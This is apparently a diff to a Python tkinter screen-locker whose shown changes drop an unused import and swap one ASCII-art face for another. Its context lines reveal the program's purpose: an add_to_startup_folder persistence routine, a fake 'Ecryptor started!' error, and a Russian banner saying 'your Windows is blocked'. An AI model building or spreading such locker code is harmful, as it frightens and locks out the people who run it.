@@ -4,7 +4,6 @@ from tkinter import messagebox
 import shutil
 import sys
 import ctypes
-import time
 
 def add_to_startup_folder():
     script_path = os.path.abspath(sys.argv[0])
@@ -78,26 +77,24 @@ error: 0x63836426
 Ecryptor started!""", foreground="white", background="blue", font=("Arial", 20))
 
 smert1 = tk.Label(root, text="""
-              a          a
-             aaa        aaa
-            aaaaaaaaaaaaaaaa
-           aaaaaaaaaaaaaaaaaa
-          aaaaafaaaaaaafaaaaaa
-          aaaaaaaaaaaaaaaaaaaa
-           aaaaaaaaaaaaaaaaaa
-            aaaaaaa  aaaaaaa
-             aaaaaaaaaaaaaa
-  a         aaaaaaaaaaaaaaaa
- aaa       aaaaaaaaaaaaaaaaaa
- aaa      aaaaaaaaaaaaaaaaaaaa
- aaa     aaaaaaaaaaaaaaaaaaaaaa
- aaa    aaaaaaaaaaaaaaaaaaaaaaaa
-  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
-  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
-  aaa    aaaaaaaaaaaaaaaaaaaaaa
-   aaa    aaaaaaaaaaaaaaaaaaaa
-    aaaaaaaaaaaaaaaaaaaaaaaaaa
-     aaaaaaaaaaaaaaaaaaaaaaaaa
+░░▄▄▄░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄▄░░
+░▄████▄░░░░░░░░░░░░░░░░░░░░░░░▄▄████▄░
+░██░▀▀███▄▄░▄▄▄████████▄▄▄░▄▄███▀░███░
+░██░░░░░▀███████▀████▀▀██████▀░░░░███░
+░██▄░░░░░░░░░▀█▀░███░░░██▀▀░░░░░░░██▀░
+░▀██▄▄░░░░░░░░░░░░▀░░░░▀░░░░░░░▄▄▄██░░
+░░▀██▀░░░░░░░░░░░░░░░░░░░░░░░░░▀███▀░░
+░░▄██░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▄░░
+░░████▀░░███░░░░░░░░░░░░░░███░░█████░░
+░░███▀░░░█████░░░░░░░░░░█████░░░▀███░░
+░░██░░░░░░▀▀▀▀░░░░░░░░░░▀▀▀▀░░░░░▀██░░
+▄▄███▄▄▄▄░░░░░░░░░░░░░░░░░░░░▄▄▄▄███▄▄
+░▄▄██▄▄░░░▄█░░░░▄▀▀▀▀▄░░░░█▄░░░▄███▄▄░
+▀░░▄████▀▀▀▀░░░░░▀▄▄▀░░░░░▀▀▀▀████▄░░▀
+░▄▀░░▀███▄▄░░░█▄▄█▀▀█▄▄▀░░░▄▄██▀░░░▀▄░
+░░░░░░░░▀███▄▄░░░░░░░░░░▄▄███▀░░░░░░░░
+░░░░░░░░░░▀▀████▄▄▄▄▄▄████▀▀░░░░░░░░░░
+░░░░░░░░░░░░░░▀▀▀▀▀▀▀▀▀▀░░░░░░░░░░░░░
 """, foreground="white", background="blue", font=("Arial", 20))
 
 label1 = tk.Label(root, text="ваш виндовс заблокирован k9gy", foreground="white", background="blue", font=("Arial", 35))
